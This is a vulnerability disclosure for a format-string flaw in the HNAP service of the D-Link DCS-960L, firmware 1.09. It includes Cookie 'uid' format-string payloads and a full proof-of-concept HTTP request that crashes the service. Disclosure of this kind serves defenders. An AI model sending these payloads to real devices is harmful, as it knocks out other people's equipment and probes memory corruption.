# DCS-960L 1.09 format string vulnerability

## Product Info

**Supplier**: [Smart Home, SMB and Enterprise solutions | D-Link (dlink.com)](https://www.dlink.com/en)

**Router model**: DCS-960L

**Router Version**: 1.09

**Firmware**: [D-Link Technical Support (dlinktw.com.tw)](https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L)



## Vulnerability introduction

â€‹    There is a format string vulnerability in the sub_402280 function of the HNAP service of D-Link DCS-960L with firmware version 1.09, which can cause the service to crash.


![image](https://github.com/user-attachments/assets/847fe2f6-9602-4449-8579-a537b01c005d)


Cookie: uid=%x%x%x%x 

![image](https://github.com/user-attachments/assets/8a81eeb2-5eea-4396-b21b-e83974ced72b)

Cookie: uid=%100x%n%n%n   crashed

![image](https://github.com/user-attachments/assets/1c63e456-ef4c-4d03-bd91-a81ffe68d925)






## POC

```http
POST /hnap/hnap_service HTTP/1.1

Host: 192.168.0.1

Content-Length: 374

SOAPAction: http://192.168.0.1/HNAP1/Login

Authorization: Basic YWRtaW46

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36

TOKEN: 32@F13DF418C72B5E92BA80E2B5A1D96AA5

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Accept: */*

Origin: http://192.168.0.1

Referer: http://192.168.0.1/audiovideo.asp?token=32

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

Cookie: uid=%100x%n%n%n

Connection: close



<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>login</Action><Username></Username><LoginPassword></LoginPassword></Login></soap:Body></soap:Envelope>
```





